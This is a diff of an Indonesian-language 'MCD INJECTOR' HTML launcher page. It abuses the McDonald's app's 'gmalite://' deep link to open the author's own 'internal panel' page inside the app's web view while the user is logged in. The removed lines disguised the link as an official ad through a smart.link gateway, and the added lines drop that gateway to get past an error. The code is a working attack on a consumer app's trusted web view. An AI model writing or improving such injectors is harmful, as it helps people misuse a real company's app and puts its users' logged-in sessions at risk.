@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>McD Launcher Pro</title>
+    <title>McD Launcher Fix</title>
     <style>
         body { font-family: -apple-system, sans-serif; text-align: center; padding: 50px 20px; background: #da291c; color: white; }
         .btn { background: #ffbc0d; color: #222; border: none; padding: 20px; border-radius: 15px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; }
@@ -12,22 +12,20 @@
 <body>
     <img src="https://www.mcdonalds.co.id/assets/img/common/mcdonalds_logo.png" width="80">
     <h2>MCD INJECTOR</h2>
-    <p>Pastikan sudah LOGIN di aplikasi McD</p>
+    <p>Gunakan Safari. Pastikan sudah Login di App McD.</p>
     <button class="btn" onclick="gas()">BUKA PANEL INTERNAL</button>
 
     <script>
         function gas() {
-            // 1. Ambil URL panel.html kamu secara otomatis
+            // Ambil URL panel.html milikmu
             var currentPath = window.location.href.split('index.html')[0];
             var myPanel = currentPath + "panel.html";
             
-            // 2. RAHASIA MUKIDI: Kita bungkus URL kita di dalam 'smart.link'
-            // agar aplikasi menganggap ini adalah link iklan resmi
-            var gateway = "https://smart.link/2le1hb5pjyoo9?weburl=" + encodeURIComponent(myPanel);
+            // BYPASS 500: Kita tidak pakai smart.link di depan.
+            // Kita pakai jalur internal mcdonalds.co.id yang diproses secara lokal oleh App.
+            var trigger = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(myPanel);
             
-            // 3. Pemicu Deep Link
-            var trigger = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(gateway);
-            
+            // Eksekusi
             window.location.href = trigger;
         }
     </script>
